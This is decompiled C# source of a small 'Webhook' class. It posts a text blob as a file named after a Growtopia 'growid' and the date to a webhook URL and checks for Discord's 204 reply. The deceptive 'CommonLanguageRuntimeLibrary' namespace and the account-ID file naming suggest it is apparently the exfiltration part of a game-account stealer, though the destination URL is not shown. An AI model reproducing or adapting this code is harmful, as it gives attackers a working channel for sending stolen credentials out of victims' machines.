using System;
using System.Net;
using System.Net.Http;
using System.Text;

namespace CommonLanguageRuntimeLibrary
{
	// Token: 0x02000005 RID: 5
	internal class Webhook
	{
		// Token: 0x0600002C RID: 44 RVA: 0x00004653 File Offset: 0x00002853
		public Webhook(string webhookUrl)
		{
			this.Client = new HttpClient();
			this.Url = webhookUrl;
		}

		// Token: 0x0600002D RID: 45 RVA: 0x00004670 File Offset: 0x00002870
		public bool SendMessage(string content, string file)
		{
			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
			multipartFormDataContent.Add(new StringContent(content), "content");
			multipartFormDataContent.Add(new ByteArrayContent(Encoding.ASCII.GetBytes(file)), Webhook.growid + "-" + DateTime.Now.ToString("dd-MM-yyyy") + ".rift", Webhook.growid + "-" + DateTime.Now.ToString("dd-MM-yyyy") + ".rift");
			HttpResponseMessage result = this.Client.PostAsync(this.Url, multipartFormDataContent).Result;
			return result.StatusCode == HttpStatusCode.NoContent;
		}

		// Token: 0x17000003 RID: 3
		// (get) Token: 0x0600002E RID: 46 RVA: 0x0000471B File Offset: 0x0000291B
		// (set) Token: 0x0600002F RID: 47 RVA: 0x00004723 File Offset: 0x00002923
		public string Name { get; set; }

		// Token: 0x17000004 RID: 4
		// (get) Token: 0x06000030 RID: 48 RVA: 0x0000472C File Offset: 0x0000292C
		// (set) Token: 0x06000031 RID: 49 RVA: 0x00004734 File Offset: 0x00002934
		public string ProfilePictureUrl { get; set; }

		// Token: 0x04000017 RID: 23
		public static string growid = "";

		// Token: 0x04000018 RID: 24
		private HttpClient Client;

		// Token: 0x04000019 RID: 25
		private string Url;
	}
}
